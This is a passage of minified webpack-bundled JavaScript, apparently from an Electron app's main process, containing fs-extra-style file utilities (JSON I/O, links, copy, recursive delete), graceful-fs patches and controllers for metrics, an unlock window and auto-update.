                    const n = t.fs || r,
                        o = !("throws" in t) || t.throws;
                    try {
                        let r = n.readFileSync(e, t);
                        return r = s(r), JSON.parse(r, t.reviver)
                    } catch (t) {
                        if (o) throw t.message = `${e}: ${t.message}`, t;
                        return null
                    }
                },
                writeFile: o.fromPromise(async function(e, t, n = {}) {
                    const s = n.fs || r,
                        a = i(t, n);
                    await o.fromCallback(s.writeFile)(e, a, n)
                }),
                writeFileSync: function(e, t, n = {}) {
                    const o = n.fs || r,
                        s = i(t, n);
                    return o.writeFileSync(e, s, n)
                }
            };
            e.exports = a
        }, function(e, t, n) {
            "use strict";
            const r = n(104);
            e.exports = {
                readJson: r.readFile,
                readJsonSync: r.readFileSync,
                writeJson: r.writeFile,
                writeJsonSync: r.writeFileSync
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromPromise,
                o = n(105);
            o.outputJson = r(n(103)), o.outputJsonSync = n(102), o.outputJSON = o.outputJson, o.outputJSONSync = o.outputJsonSync, o.writeJSON = o.writeJson, o.writeJSONSync = o.writeJsonSync, o.readJSON = o.readJson, o.readJSONSync = o.readJsonSync, e.exports = o
        }, function(e, t, n) {
            "use strict";
            const r = n(12);
            e.exports = {
                symlinkType: function(e, t, n) {
                    if (n = "function" == typeof t ? t : n, t = "function" != typeof t && t) return n(null, t);
                    r.lstat(e, (e, r) => {
                        if (e) return n(null, "file");
                        t = r && r.isDirectory() ? "dir" : "file", n(null, t)
                    })
                },
                symlinkTypeSync: function(e, t) {
                    let n;
                    if (t) return t;
                    try {
                        n = r.lstatSync(e)
                    } catch {
                        return "file"
                    }
                    return n && n.isDirectory() ? "dir" : "file"
                }
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(2),
                o = n(12),
                i = n(30).pathExists;
            e.exports = {
                symlinkPaths: function(e, t, n) {
                    if (r.isAbsolute(e)) return o.lstat(e, t => t ? (t.message = t.message.replace("lstat", "ensureSymlink"), n(t)) : n(null, {
                        toCwd: e,
                        toDst: e
                    }));
                    {
                        const s = r.dirname(t),
                            a = r.join(s, e);
                        return i(a, (t, i) => t ? n(t) : i ? n(null, {
                            toCwd: a,
                            toDst: e
                        }) : o.lstat(e, t => t ? (t.message = t.message.replace("lstat", "ensureSymlink"), n(t)) : n(null, {
                            toCwd: e,
                            toDst: r.relative(s, e)
                        })))
                    }
                },
                symlinkPathsSync: function(e, t) {
                    let n;
                    if (r.isAbsolute(e)) {
                        if (!(n = o.existsSync(e))) throw new Error("absolute srcpath does not exist");
                        return {
                            toCwd: e,
                            toDst: e
                        }
                    } {
                        const i = r.dirname(t),
                            s = r.join(i, e);
                        if (n = o.existsSync(s)) return {
                            toCwd: s,
                            toDst: e
                        };
                        if (!(n = o.existsSync(e))) throw new Error("relative srcpath does not exist");
                        return {
                            toCwd: e,
                            toDst: r.relative(i, e)
                        }
                    }
                }
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromCallback,
                o = n(2),
                i = n(39),
                s = n(21),
                a = s.mkdirs,
                c = s.mkdirsSync,
                u = n(108),
                l = u.symlinkPaths,
                d = u.symlinkPathsSync,
                f = n(107),
                p = f.symlinkType,
                h = f.symlinkTypeSync,
                w = n(30).pathExists,
                {
                    areIdentical: m
                } = n(38);

            function b(e, t, n, r) {
                l(e, t, (s, c) => {
                    if (s) return r(s);
                    e = c.toDst, p(c.toCwd, n, (n, s) => {
                        if (n) return r(n);
                        const c = o.dirname(t);
                        w(c, (n, o) => n ? r(n) : o ? i.symlink(e, t, s, r) : void a(c, n => {
                            if (n) return r(n);
                            i.symlink(e, t, s, r)
                        }))
                    })
                })
            }
            e.exports = {
                createSymlink: r(function(e, t, n, r) {
                    r = "function" == typeof n ? n : r, n = "function" != typeof n && n, i.lstat(t, (o, s) => {
                        !o && s.isSymbolicLink() ? Promise.all([i.stat(e), i.stat(t)]).then(([o, i]) => {
                            if (m(o, i)) return r(null);
                            b(e, t, n, r)
                        }) : b(e, t, n, r)
                    })
                }),
                createSymlinkSync: function(e, t, n) {
                    let r;
                    try {
                        r = i.lstatSync(t)
                    } catch {}
                    if (r && r.isSymbolicLink()) {
                        const n = i.statSync(e),
                            r = i.statSync(t);
                        if (m(n, r)) return
                    }
                    const s = d(e, t);
                    e = s.toDst, n = h(s.toCwd, n);
                    const a = o.dirname(t);
                    return i.existsSync(a) ? i.symlinkSync(e, t, n) : (c(a), i.symlinkSync(e, t, n))
                }
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromCallback,
                o = n(2),
                i = n(12),
                s = n(21),
                a = n(30).pathExists,
                {
                    areIdentical: c
                } = n(38);
            e.exports = {
                createLink: r(function(e, t, n) {
                    function r(e, t) {
                        i.link(e, t, e => {
                            if (e) return n(e);
                            n(null)
                        })
                    }
                    i.lstat(t, (u, l) => {
                        i.lstat(e, (i, u) => {
                            if (i) return i.message = i.message.replace("lstat", "ensureLink"), n(i);
                            if (l && c(u, l)) return n(null);
                            const d = o.dirname(t);
                            a(d, (o, i) => o ? n(o) : i ? r(e, t) : void s.mkdirs(d, o => {
                                if (o) return n(o);
                                r(e, t)
                            }))
                        })
                    })
                }),
                createLinkSync: function(e, t) {
                    let n;
                    try {
                        n = i.lstatSync(t)
                    } catch {}
                    try {
                        const t = i.lstatSync(e);
                        if (n && c(t, n)) return
                    } catch (e) {
                        throw e.message = e.message.replace("lstat", "ensureLink"), e
                    }
                    const r = o.dirname(t);
                    return i.existsSync(r) ? i.linkSync(e, t) : (s.mkdirsSync(r), i.linkSync(e, t))
                }
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromCallback,
                o = n(2),
                i = n(12),
                s = n(21);
            e.exports = {
                createFile: r(function(e, t) {
                    function n() {
                        i.writeFile(e, "", e => {
                            if (e) return t(e);
                            t()
                        })
                    }
                    i.stat(e, (r, a) => {
                        if (!r && a.isFile()) return t();
                        const c = o.dirname(e);
                        i.stat(c, (e, r) => {
                            if (e) return "ENOENT" === e.code ? s.mkdirs(c, e => {
                                if (e) return t(e);
                                n()
                            }) : t(e);
                            r.isDirectory() ? n() : i.readdir(c, e => {
                                if (e) return t(e)
                            })
                        })
                    })
                }),
                createFileSync: function(e) {
                    let t;
                    try {
                        t = i.statSync(e)
                    } catch {}
                    if (t && t.isFile()) return;
                    const n = o.dirname(e);
                    try {
                        i.statSync(n).isDirectory() || i.readdirSync(n)
                    } catch (e) {
                        if (!e || "ENOENT" !== e.code) throw e;
                        s.mkdirsSync(n)
                    }
                    i.writeFileSync(e, "")
                }
            }
        }, function(e, t, n) {
            "use strict";
            const {
                createFile: r,
                createFileSync: o
            } = n(111), {
                createLink: i,
                createLinkSync: s
            } = n(110), {
                createSymlink: a,
                createSymlinkSync: c
            } = n(109);
            e.exports = {
                createFile: r,
                createFileSync: o,
                ensureFile: r,
                ensureFileSync: o,
                createLink: i,
                createLinkSync: s,
                ensureLink: i,
                ensureLinkSync: s,
                createSymlink: a,
                createSymlinkSync: c,
                ensureSymlink: a,
                ensureSymlinkSync: c
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(12),
                o = n(2),
                i = n(69),
                s = "win32" === process.platform;

            function a(e) {
                ["unlink", "chmod", "stat", "lstat", "rmdir", "readdir"].forEach(t => {
                    e[t] = e[t] || r[t], e[t += "Sync"] = e[t] || r[t]
                }), e.maxBusyTries = e.maxBusyTries || 3
            }

            function c(e, t, n) {
                let r = 0;
                "function" == typeof t && (n = t, t = {}), i(e, "rimraf: missing path"), i.strictEqual(typeof e, "string", "rimraf: path should be a string"), i.strictEqual(typeof n, "function", "rimraf: callback function required"), i(t, "rimraf: invalid options argument provided"), i.strictEqual(typeof t, "object", "rimraf: options should be object"), a(t), u(e, t, function o(i) {
                    if (i) {
                        if (("EBUSY" === i.code || "ENOTEMPTY" === i.code || "EPERM" === i.code) && r < t.maxBusyTries) {
                            return r++, setTimeout(() => u(e, t, o), 100 * r)
                        }
                        "ENOENT" === i.code && (i = null)
                    }
                    n(i)
                })
            }

            function u(e, t, n) {
                i(e), i(t), i("function" == typeof n), t.lstat(e, (r, o) => r && "ENOENT" === r.code ? n(null) : r && "EPERM" === r.code && s ? l(e, t, r, n) : o && o.isDirectory() ? f(e, t, r, n) : void t.unlink(e, r => {
                    if (r) {
                        if ("ENOENT" === r.code) return n(null);
                        if ("EPERM" === r.code) return s ? l(e, t, r, n) : f(e, t, r, n);
                        if ("EISDIR" === r.code) return f(e, t, r, n)
                    }
                    return n(r)
                }))
            }

            function l(e, t, n, r) {
                i(e), i(t), i("function" == typeof r), t.chmod(e, 438, o => {
                    o ? r("ENOENT" === o.code ? null : n) : t.stat(e, (o, i) => {
                        o ? r("ENOENT" === o.code ? null : n) : i.isDirectory() ? f(e, t, n, r) : t.unlink(e, r)
                    })
                })
            }

            function d(e, t, n) {
                let r;
                i(e), i(t);
                try {
                    t.chmodSync(e, 438)
                } catch (e) {
                    if ("ENOENT" === e.code) return;
                    throw n
                }
                try {
                    r = t.statSync(e)
                } catch (e) {
                    if ("ENOENT" === e.code) return;
                    throw n
                }
                r.isDirectory() ? h(e, t, n) : t.unlinkSync(e)
            }

            function f(e, t, n, r) {
                i(e), i(t), i("function" == typeof r), t.rmdir(e, s => {
                    !s || "ENOTEMPTY" !== s.code && "EEXIST" !== s.code && "EPERM" !== s.code ? s && "ENOTDIR" === s.code ? r(n) : r(s) : function(e, t, n) {
                        i(e), i(t), i("function" == typeof n), t.readdir(e, (r, i) => {
                            if (r) return n(r);
                            let s, a = i.length;
                            if (0 === a) return t.rmdir(e, n);
                            i.forEach(r => {
                                c(o.join(e, r), t, r => {
                                    if (!s) return r ? n(s = r) : void(0 == --a && t.rmdir(e, n))
                                })
                            })
                        })
                    }(e, t, r)
                })
            }

            function p(e, t) {
                let n;
                a(t = t || {}), i(e, "rimraf: missing path"), i.strictEqual(typeof e, "string", "rimraf: path should be a string"), i(t, "rimraf: missing options"), i.strictEqual(typeof t, "object", "rimraf: options should be object");
                try {
                    n = t.lstatSync(e)
                } catch (n) {
                    if ("ENOENT" === n.code) return;
                    "EPERM" === n.code && s && d(e, t, n)
                }
                try {
                    n && n.isDirectory() ? h(e, t, null) : t.unlinkSync(e)
                } catch (n) {
                    if ("ENOENT" === n.code) return;
                    if ("EPERM" === n.code) return s ? d(e, t, n) : h(e, t, n);
                    if ("EISDIR" !== n.code) throw n;
                    h(e, t, n)
                }
            }

            function h(e, t, n) {
                i(e), i(t);
                try {
                    t.rmdirSync(e)
                } catch (r) {
                    if ("ENOTDIR" === r.code) throw n;
                    if ("ENOTEMPTY" === r.code || "EEXIST" === r.code || "EPERM" === r.code) ! function(e, t) {
                        if (i(e), i(t), t.readdirSync(e).forEach(n => p(o.join(e, n), t)), !s) {
                            const n = t.rmdirSync(e, t);
                            return n
                        } {
                            const n = Date.now();
                            do {
                                try {
                                    const n = t.rmdirSync(e, t);
                                    return n
                                } catch {}
                            } while (Date.now() - n < 500)
                        }
                    }(e, t);
                    else if ("ENOENT" !== r.code) throw r
                }
            }
            e.exports = c, c.sync = p
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromPromise,
                o = n(39),
                i = n(2),
                s = n(21),
                a = n(47),
                c = r(async function(e) {
                    let t;
                    try {
                        t = await o.readdir(e)
                    } catch {
                        return s.mkdirs(e)
                    }
                    return Promise.all(t.map(t => a.remove(i.join(e, t))))
                });

            function u(e) {
                let t;
                try {
                    t = o.readdirSync(e)
                } catch {
                    return s.mkdirsSync(e)
                }
                t.forEach(t => {
                    t = i.join(e, t), a.removeSync(t)
                })
            }
            e.exports = {
                emptyDirSync: u,
                emptydirSync: u,
                emptyDir: c,
                emptydir: c
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(12),
                o = n(2),
                i = n(21).mkdirsSync,
                s = n(68).utimesMillisSync,
                a = n(38);

            function c(e, t, n, i) {
                const s = (i.dereference ? r.statSync : r.lstatSync)(t);
                if (s.isDirectory()) return function(e, t, n, o, i) {
                    return t ? d(n, o, i) : function(e, t, n, o) {
                        return r.mkdirSync(n), d(t, n, o), l(n, e)
                    }(e.mode, n, o, i)
                }(s, e, t, n, i);
                if (s.isFile() || s.isCharacterDevice() || s.isBlockDevice()) return function(e, t, n, o, i) {
                    return t ? function(e, t, n, o) {
                        if (o.overwrite) return r.unlinkSync(n), u(e, t, n, o);
                        if (o.errorOnExist) throw new Error(`'${n}' already exists`)
                    }(e, n, o, i) : u(e, n, o, i)
                }(s, e, t, n, i);
                if (s.isSymbolicLink()) return function(e, t, n, i) {
                    let s = r.readlinkSync(t);
                    i.dereference && (s = o.resolve(process.cwd(), s));
                    if (e) {
                        let e;
                        try {
                            e = r.readlinkSync(n)
                        } catch (e) {
                            if ("EINVAL" === e.code || "UNKNOWN" === e.code) return r.symlinkSync(s, n);
                            throw e
                        }
                        if (i.dereference && (e = o.resolve(process.cwd(), e)), a.isSrcSubdir(s, e)) throw new Error(`Cannot copy '${s}' to a subdirectory of itself, '${e}'.`);
                        if (r.statSync(n).isDirectory() && a.isSrcSubdir(e, s)) throw new Error(`Cannot overwrite '${e}' with '${s}'.`);
                        return function(e, t) {
                            return r.unlinkSync(t), r.symlinkSync(e, t)
                        }(s, n)
                    }
                    return r.symlinkSync(s, n)
                }(e, t, n, i);
                if (s.isSocket()) throw new Error(`Cannot copy a socket file: ${t}`);
                if (s.isFIFO()) throw new Error(`Cannot copy a FIFO pipe: ${t}`);
                throw new Error(`Unknown file: ${t}`)
            }

            function u(e, t, n, o) {
                return r.copyFileSync(t, n), o.preserveTimestamps && function(e, t, n) {
                    (function(e) {
                        return 0 == (128 & e)
                    })(e) && function(e, t) {
                        l(e, 128 | t)
                    }(n, e);
                    (function(e, t) {
                        const n = r.statSync(e);
                        s(t, n.atime, n.mtime)
                    })(t, n)
                }(e.mode, t, n), l(n, e.mode)
            }

            function l(e, t) {
                return r.chmodSync(e, t)
            }

            function d(e, t, n) {
                r.readdirSync(e).forEach(r => (function(e, t, n, r) {
                    const i = o.join(t, e),
                        s = o.join(n, e),
                        {
                            destStat: u
                        } = a.checkPathsSync(i, s, "copy", r);
                    return function(e, t, n, r) {
                        if (!r.filter || r.filter(t, n)) return c(e, t, n, r)
                    }(u, i, s, r)
                })(r, e, t, n))
            }
            e.exports = function(e, t, n) {
                "function" == typeof n && (n = {
                    filter: n
                }), (n = n || {}).clobber = !("clobber" in n && !n.clobber), n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber, n.preserveTimestamps && "ia32" === process.arch && process.emitWarning("Using the preserveTimestamps option in 32-bit node is not recommended;\n\n\tsee https://github.com/jprichardson/node-fs-extra/issues/269", "Warning", "fs-extra-WARN0002");
                const {
                    srcStat: s,
                    destStat: u
                } = a.checkPathsSync(e, t, "copy", n);
                return a.checkParentPathsSync(e, s, t, "copy"),
                    function(e, t, n, s) {
                        if (s.filter && !s.filter(t, n)) return;
                        const a = o.dirname(n);
                        return r.existsSync(a) || i(a), c(e, t, n, s)
                    }(u, e, t, n)
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(2);
            e.exports.checkPath = function(e) {
                if ("win32" === process.platform) {
                    if (/[<>:"|?*]/.test(e.replace(r.parse(e).root, ""))) {
                        const t = new Error(`Path contains invalid characters: ${e}`);
                        throw t.code = "EINVAL", t
                    }
                }
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(39),
                {
                    checkPath: o
                } = n(116),
                i = e => {
                    return "number" == typeof e ? e : {
                        ...{
                            mode: 511
                        },
                        ...e
                    }.mode
                };
            e.exports.makeDir = (async (e, t) => (o(e), r.mkdir(e, {
                mode: i(t),
                recursive: !0
            }))), e.exports.makeDirSync = ((e, t) => (o(e), r.mkdirSync(e, {
                mode: i(t),
                recursive: !0
            })))
        }, function(e, t, n) {
            "use strict";
            const r = n(12),
                o = n(2),
                i = n(21).mkdirs,
                s = n(30).pathExists,
                a = n(68).utimesMillis,
                c = n(38);

            function u(e, t, n, r, a) {
                const c = o.dirname(n);
                s(c, (o, s) => o ? a(o) : s ? d(e, t, n, r, a) : void i(c, o => o ? a(o) : d(e, t, n, r, a)))
            }

            function l(e, t, n, r, o, i) {
                Promise.resolve(o.filter(n, r)).then(s => s ? e(t, n, r, o, i) : i(), e => i(e))
            }

            function d(e, t, n, o, i) {
                (o.dereference ? r.stat : r.lstat)(t, (s, a) => s ? i(s) : a.isDirectory() ? function(e, t, n, o, i, s) {
                    return t ? w(n, o, i, s) : function(e, t, n, o, i) {
                        r.mkdir(n, r => {
                            if (r) return i(r);
                            w(t, n, o, t => t ? i(t) : h(n, e, i))
                        })
                    }(e.mode, n, o, i, s)
                }(a, e, t, n, o, i) : a.isFile() || a.isCharacterDevice() || a.isBlockDevice() ? function(e, t, n, o, i, s) {
                    return t ? function(e, t, n, o, i) {
                        if (!o.overwrite) return o.errorOnExist ? i(new Error(`'${n}' already exists`)) : i();
                        r.unlink(n, r => r ? i(r) : f(e, t, n, o, i))
                    }(e, n, o, i, s) : f(e, n, o, i, s)
                }(a, e, t, n, o, i) : a.isSymbolicLink() ? b(e, t, n, o, i) : a.isSocket() ? i(new Error(`Cannot copy a socket file: ${t}`)) : a.isFIFO() ? i(new Error(`Cannot copy a FIFO pipe: ${t}`)) : i(new Error(`Unknown file: ${t}`)))
            }

            function f(e, t, n, o, i) {
                r.copyFile(t, n, r => r ? i(r) : o.preserveTimestamps ? function(e, t, n, r) {
                    if (function(e) {
                            return 0 == (128 & e)
                        }(e)) return function(e, t, n) {
                        return h(e, 128 | t, n)
                    }(n, e, o => o ? r(o) : p(e, t, n, r));
                    return p(e, t, n, r)
                }(e.mode, t, n, i) : h(n, e.mode, i))
            }

            function p(e, t, n, o) {
                ! function(e, t, n) {
                    r.stat(e, (e, r) => e ? n(e) : a(t, r.atime, r.mtime, n))
                }(t, n, t => t ? o(t) : h(n, e, o))
            }

            function h(e, t, n) {
                return r.chmod(e, t, n)
            }

            function w(e, t, n, o) {
                r.readdir(e, (r, i) => r ? o(r) : m(i, e, t, n, o))
            }

            function m(e, t, n, r, i) {
                const s = e.pop();
                return s ? function(e, t, n, r, i, s) {
                    const a = o.join(n, t),
                        u = o.join(r, t);
                    c.checkPaths(a, u, "copy", i, (t, o) => {
                        if (t) return s(t);
                        const {
                            destStat: c
                        } = o;
                        ! function(e, t, n, r, o) {
                            r.filter ? l(d, e, t, n, r, o) : d(e, t, n, r, o)
                        }(c, a, u, i, t => t ? s(t) : m(e, n, r, i, s))
                    })
                }(e, s, t, n, r, i) : i()
            }

            function b(e, t, n, i, s) {
                r.readlink(t, (t, a) => t ? s(t) : (i.dereference && (a = o.resolve(process.cwd(), a)), e ? void r.readlink(n, (t, u) => t ? "EINVAL" === t.code || "UNKNOWN" === t.code ? r.symlink(a, n, s) : s(t) : (i.dereference && (u = o.resolve(process.cwd(), u)), c.isSrcSubdir(a, u) ? s(new Error(`Cannot copy '${a}' to a subdirectory of itself, '${u}'.`)) : e.isDirectory() && c.isSrcSubdir(u, a) ? s(new Error(`Cannot overwrite '${u}' with '${a}'.`)) : function(e, t, n) {
                    r.unlink(t, o => o ? n(o) : r.symlink(e, t, n))
                }(a, n, s))) : r.symlink(a, n, s)))
            }
            e.exports = function(e, t, n, r) {
                "function" != typeof n || r ? "function" == typeof n && (n = {
                    filter: n
                }) : (r = n, n = {}), r = r || function() {}, (n = n || {}).clobber = !("clobber" in n && !n.clobber), n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber, n.preserveTimestamps && "ia32" === process.arch && process.emitWarning("Using the preserveTimestamps option in 32-bit node is not recommended;\n\n\tsee https://github.com/jprichardson/node-fs-extra/issues/269", "Warning", "fs-extra-WARN0001"), c.checkPaths(e, t, "copy", n, (o, i) => {
                    if (o) return r(o);
                    const {
                        srcStat: s,
                        destStat: a
                    } = i;
                    c.checkParentPaths(e, s, t, "copy", o => o ? r(o) : n.filter ? l(u, a, e, t, n, r) : u(a, e, t, n, r))
                })
            }
        }, function(e, t, n) {
            "use strict";
            e.exports = function(e) {
                if (null === e || "object" != typeof e) return e;
                if (e instanceof Object) var t = {
                    __proto__: r(e)
                };
                else var t = Object.create(null);
                return Object.getOwnPropertyNames(e).forEach(function(n) {
                    Object.defineProperty(t, n, Object.getOwnPropertyDescriptor(e, n))
                }), t
            };
            var r = Object.getPrototypeOf || function(e) {
                return e.__proto__
            }
        }, function(e, t) {
            e.exports = require("stream")
        }, function(e, t, n) {
            var r = n(120).Stream;
            e.exports = function(e) {
                return {
                    ReadStream: function t(n, o) {
                        if (!(this instanceof t)) return new t(n, o);
                        r.call(this);
                        var i = this;
                        this.path = n;
                        this.fd = null;
                        this.readable = !0;
                        this.paused = !1;
                        this.flags = "r";
                        this.mode = 438;
                        this.bufferSize = 65536;
                        o = o || {};
                        var s = Object.keys(o);
                        for (var a = 0, c = s.length; a < c; a++) {
                            var u = s[a];
                            this[u] = o[u]
                        }
                        this.encoding && this.setEncoding(this.encoding);
                        if (void 0 !== this.start) {
                            if ("number" != typeof this.start) throw TypeError("start must be a Number");
                            if (void 0 === this.end) this.end = 1 / 0;
                            else if ("number" != typeof this.end) throw TypeError("end must be a Number");
                            if (this.start > this.end) throw new Error("start must be <= end");
                            this.pos = this.start
                        }
                        if (null !== this.fd) return void process.nextTick(function() {
                            i._read()
                        });
                        e.open(this.path, this.flags, this.mode, function(e, t) {
                            if (e) return i.emit("error", e), void(i.readable = !1);
                            i.fd = t, i.emit("open", t), i._read()
                        })
                    },
                    WriteStream: function t(n, o) {
                        if (!(this instanceof t)) return new t(n, o);
                        r.call(this);
                        this.path = n;
                        this.fd = null;
                        this.writable = !0;
                        this.flags = "w";
                        this.encoding = "binary";
                        this.mode = 438;
                        this.bytesWritten = 0;
                        o = o || {};
                        var i = Object.keys(o);
                        for (var s = 0, a = i.length; s < a; s++) {
                            var c = i[s];
                            this[c] = o[c]
                        }
                        if (void 0 !== this.start) {
                            if ("number" != typeof this.start) throw TypeError("start must be a Number");
                            if (this.start < 0) throw new Error("start must be >= zero");
                            this.pos = this.start
                        }
                        this.busy = !1;
                        this._queue = [];
                        null === this.fd && (this._open = e.open, this._queue.push([this._open, this.path, this.flags, this.mode, void 0]), this.flush())
                    }
                }
            }
        }, function(e, t) {
            e.exports = require("constants")
        }, function(e, t, n) {
            var r = n(122),
                o = process.cwd,
                i = null,
                s = process.platform;
            process.cwd = function() {
                return i || (i = o.call(process)), i
            };
            try {
                process.cwd()
            } catch (e) {}
            if ("function" == typeof process.chdir) {
                var a = process.chdir;
                process.chdir = function(e) {
                    i = null, a.call(process, e)
                }, Object.setPrototypeOf && Object.setPrototypeOf(process.chdir, a)
            }
            e.exports = function(e) {
                r.hasOwnProperty("O_SYMLINK") && process.version.match(/^v0\.6\.[0-2]|^v0\.5\./) && function(e) {
                    e.lchmod = function(t, n, o) {
                        e.open(t, r.O_WRONLY | r.O_SYMLINK, n, function(t, r) {
                            t ? o && o(t) : e.fchmod(r, n, function(t) {
                                e.close(r, function(e) {
                                    o && o(t || e)
                                })
                            })
                        })
                    }, e.lchmodSync = function(t, n) {
                        var o, i = e.openSync(t, r.O_WRONLY | r.O_SYMLINK, n),
                            s = !0;
                        try {
                            o = e.fchmodSync(i, n), s = !1
                        } finally {
                            if (s) try {
                                e.closeSync(i)
                            } catch (e) {} else e.closeSync(i)
                        }
                        return o
                    }
                }(e);
                e.lutimes || function(e) {
                    r.hasOwnProperty("O_SYMLINK") && e.futimes ? (e.lutimes = function(t, n, o, i) {
                        e.open(t, r.O_SYMLINK, function(t, r) {
                            t ? i && i(t) : e.futimes(r, n, o, function(t) {
                                e.close(r, function(e) {
                                    i && i(t || e)
                                })
                            })
                        })
                    }, e.lutimesSync = function(t, n, o) {
                        var i, s = e.openSync(t, r.O_SYMLINK),
                            a = !0;
                        try {
                            i = e.futimesSync(s, n, o), a = !1
                        } finally {
                            if (a) try {
                                e.closeSync(s)
                            } catch (e) {} else e.closeSync(s)
                        }
                        return i
                    }) : e.futimes && (e.lutimes = function(e, t, n, r) {
                        r && process.nextTick(r)
                    }, e.lutimesSync = function() {})
                }(e);
                e.chown = o(e.chown), e.fchown = o(e.fchown), e.lchown = o(e.lchown), e.chmod = t(e.chmod), e.fchmod = t(e.fchmod), e.lchmod = t(e.lchmod), e.chownSync = i(e.chownSync), e.fchownSync = i(e.fchownSync), e.lchownSync = i(e.lchownSync), e.chmodSync = n(e.chmodSync), e.fchmodSync = n(e.fchmodSync), e.lchmodSync = n(e.lchmodSync), e.stat = a(e.stat), e.fstat = a(e.fstat), e.lstat = a(e.lstat), e.statSync = c(e.statSync), e.fstatSync = c(e.fstatSync), e.lstatSync = c(e.lstatSync), e.chmod && !e.lchmod && (e.lchmod = function(e, t, n) {
                    n && process.nextTick(n)
                }, e.lchmodSync = function() {});
                e.chown && !e.lchown && (e.lchown = function(e, t, n, r) {
                    r && process.nextTick(r)
                }, e.lchownSync = function() {});
                "win32" === s && (e.rename = "function" != typeof e.rename ? e.rename : function(t) {
                    function n(n, r, o) {
                        var i = Date.now(),
                            s = 0;
                        t(n, r, function a(c) {
                            if (c && ("EACCES" === c.code || "EPERM" === c.code) && Date.now() - i < 6e4) return setTimeout(function() {
                                e.stat(r, function(e, i) {
                                    e && "ENOENT" === e.code ? t(n, r, a) : o(c)
                                })
                            }, s), void(s < 100 && (s += 10));
                            o && o(c)
                        })
                    }
                    return Object.setPrototypeOf && Object.setPrototypeOf(n, t), n
                }(e.rename));

                function t(t) {
                    return t ? function(n, r, o) {
                        return t.call(e, n, r, function(e) {
                            u(e) && (e = null), o && o.apply(this, arguments)
                        })
                    } : t
                }

                function n(t) {
                    return t ? function(n, r) {
                        try {
                            return t.call(e, n, r)
                        } catch (e) {
                            if (!u(e)) throw e
                        }
                    } : t
                }

                function o(t) {
                    return t ? function(n, r, o, i) {
                        return t.call(e, n, r, o, function(e) {
                            u(e) && (e = null), i && i.apply(this, arguments)
                        })
                    } : t
                }

                function i(t) {
                    return t ? function(n, r, o) {
                        try {
                            return t.call(e, n, r, o)
                        } catch (e) {
                            if (!u(e)) throw e
                        }
                    } : t
                }

                function a(t) {
                    return t ? function(n, r, o) {
                        function i(e, t) {
                            t && (t.uid < 0 && (t.uid += 4294967296), t.gid < 0 && (t.gid += 4294967296)), o && o.apply(this, arguments)
                        }
                        return "function" == typeof r && (o = r, r = null), r ? t.call(e, n, r, i) : t.call(e, n, i)
                    } : t
                }

                function c(t) {
                    return t ? function(n, r) {
                        var o = r ? t.call(e, n, r) : t.call(e, n);
                        return o && (o.uid < 0 && (o.uid += 4294967296), o.gid < 0 && (o.gid += 4294967296)), o
                    } : t
                }

                function u(e) {
                    if (!e) return !0;
                    if ("ENOSYS" === e.code) return !0;
                    var t = !process.getuid || 0 !== process.getuid();
                    return !(!t || "EINVAL" !== e.code && "EPERM" !== e.code)
                }
                e.read = "function" != typeof e.read ? e.read : function(t) {
                    function n(n, r, o, i, s, a) {
                        var c;
                        if (a && "function" == typeof a) {
                            var u = 0;
                            c = function(l, d, f) {
                                if (l && "EAGAIN" === l.code && u < 10) return u++, t.call(e, n, r, o, i, s, c);
                                a.apply(this, arguments)
                            }
                        }
                        return t.call(e, n, r, o, i, s, c)
                    }
                    return Object.setPrototypeOf && Object.setPrototypeOf(n, t), n
                }(e.read), e.readSync = "function" != typeof e.readSync ? e.readSync : (l = e.readSync, function(t, n, r, o, i) {
                    for (var s = 0;;) try {
                        return l.call(e, t, n, r, o, i)
                    } catch (e) {
                        if ("EAGAIN" === e.code && s < 10) {
                            s++;
                            continue
                        }
                        throw e
                    }
                });
                var l
            }
        }, function(e, t, n) {
            "use strict";
            var r = n(20),
                o = n.n(r),
                i = n(4);
            Object(i.createServer)("metrics-controller", ["ui"], {
                getTimeOrigin: o.a.getTimeOrigin,
                getTrace: o.a.getTrace
            })
        }, function(e, t, n) {
            "use strict";
            var r = n(4),
                o = n(32);
            let i, s = null,
                a = 0;
            const c = {
                requestHide() {
                    i({
                        status: s || "cancel",
                        attempts: a
                    })
                },
                async unlock() {
                    const e = Object(o.getWindow)();
                    return new Promise(t => {
                        s = null, i = t, e.show(), setImmediate(() => e.send("unlock:show"))
                    })
                },
                async closeUnlockWindow() {
                    const e = Object(o.getWindow)();
                    e.hide(), setImmediate(() => e.send("unlock:hide"))
                },
                async setStatus(e, t) {
                    s = e, a = t
                }
            };
            Object(r.createServer)("unlock-controller", ["unlock", "ui"], c)
        }, function(e, t, n) {
            "use strict";
            var r = n(52),
                o = n.n(r),
                i = n(0),
                s = n(31),
                a = n.n(s),
                c = n(43),
                u = n(87),
                l = n(4);
            const d = Object(c.promisify)(o.a.execFile),
                f = {
                    async startUpdate(e) {
                        const t = Object(u.getAutoUpdateUrls)(e);
                        let n = t[process.platform];
                        if ("darwin" === process.platform)("arm64" === process.arch || await async function() {
                            if ("darwin" === process.platform && "x64" === process.arch) {
                                const [e, t] = a.a.release().split(".").map(Number);
                                if (e > 20 || 20 === e && t >= 5) try {
                                    const {
                                        stdout: e,
                                        stderr: t
                                    } = await d("sysctl", ["sysctl.proc_translated"]);
                                    return "sysctl.proc_translated: 1" === e.trim() && "" === t.trim()
                                } catch {
                                    return !1
                                }
                            }
                            return !1
                        }()) && (n = t.darwinArm);
                        else if ("linux" === process.platform) throw new Error("autoUpdate unsupported for linux");
                        return new Promise((e, t) => {
                            i.autoUpdater.on("error", e => {
                                console.error(`Update error: ${e.message}`), t(e)
                            }), i.autoUpdater.on("checking-for-update", () => console.log("Checking for update")), i.autoUpdater.on("update-available", () => console.log("Update available")), i.autoUpdater.on("update-not-available", () => console.log("No update available")), i.autoUpdater.on("update-downloaded", (t, n, r, o, i) => {
                                console.log(`Update downloaded: ${r}: ${i}`), e()
